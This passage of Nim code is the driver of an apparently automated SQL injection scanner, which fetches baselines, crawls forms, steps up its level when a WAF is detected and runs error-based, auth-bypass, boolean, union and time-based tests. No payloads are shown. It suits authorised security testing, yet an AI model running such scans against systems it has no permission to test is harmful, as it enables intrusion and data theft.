        scanFormUnionBased(cfg, form, field, baseline, result.requestCount))

    if techTime in cfg.techniques:
      result.vulns.add(
        scanFormTimeBased(cfg, form, field, baseline, result.requestCount))

  if not testedAny:
    warn("  No testable input fields found in form #" & $formIdx)


proc scan*(cfg: ScanConfig): ScanResult =
  let t0Start = epochTime()
  result.target = cfg.url

  info("Fetching baseline response...")
  var baseline = sendRequestWithRetry(cfg)
  inc result.requestCount

  if baseline.err.len > 0:
    error("Cannot reach target: " & baseline.err)
    return
  maybeReportWaf(baseline, "baseline")

  info("Baseline: HTTP " & $baseline.statusCode &
       " | " & $baseline.body.len & " bytes" &
       " | " & baseline.elapsed.formatFloat(ffDecimal, 3) & "s")

  var scanCfg = cfg
  if wafEvidence(baseline).len > 0:
    scanCfg.level = max(scanCfg.level, 4)

  let params = detectParams(scanCfg)
  if params.len == 0:
    warn("No parameters to test.")
    result.duration = epochTime() - t0Start
    return

  info("Parameters to test: " & params.join(", "))
  result.testedParams = params

  let queryParams =
    if cfg.httpMethod == hmGet: parseQueryParams(cfg.url)
    else: parseFormParams(cfg.data)

  for param in params:
    info("Testing parameter: [" & param & "]")

    if techError in scanCfg.techniques:
      let vulns = scanErrorBased(scanCfg, param, queryParams, baseline, result.requestCount)
      result.vulns.add(vulns)

    if techAuth in scanCfg.techniques:
      result.vulns.add(scanAuthBypass(scanCfg, param, queryParams, baseline, result.requestCount))

    if techBoolean in scanCfg.techniques:
      result.vulns.add(scanBooleanBased(scanCfg, param, queryParams, baseline, result.requestCount))

    if techUnion in scanCfg.techniques:
      result.vulns.add(scanUnionBased(scanCfg, param, queryParams, baseline, result.requestCount))

    if techTime in scanCfg.techniques:
      let vulns = scanTimeBased(scanCfg, param, queryParams, baseline, result.requestCount)
      result.vulns.add(vulns)

  result.duration = epochTime() - t0Start
  info("Scan complete. Requests sent: " & $result.requestCount &
       " | Duration: " & result.duration.formatFloat(ffDecimal, 2) & "s")

proc scanCrawled*(cfg: ScanConfig): ScanResult =
  let t0Start = epochTime()
  result.target = cfg.url

  info("Fetching page for form discovery: " & cfg.url)
  let pageResp = sendRequestWithRetry(cfg)
  inc result.requestCount

  if pageResp.err.len > 0:
    error("Cannot reach target: " & pageResp.err)
    return
  maybeReportWaf(pageResp, "page fetch")
  info("Page: HTTP " & $pageResp.statusCode &
       " | " & $pageResp.body.len & " bytes")

  var scanCfg = cfg
  if wafEvidence(pageResp).len > 0:
    scanCfg.level = max(scanCfg.level, 4)

  let forms = crawlForms(pageResp.body, cfg.url)
  printForms(forms)

  if forms.len == 0:
    result.duration = epochTime() - t0Start
    return

  for i, form in forms:
    scanForm(scanCfg, form, i + 1, result)

  result.duration = epochTime() - t0Start
  info("Crawl-scan complete. Requests: " & $result.requestCount &
       " | Duration: " & result.duration.formatFloat(ffDecimal, 2) & "s")
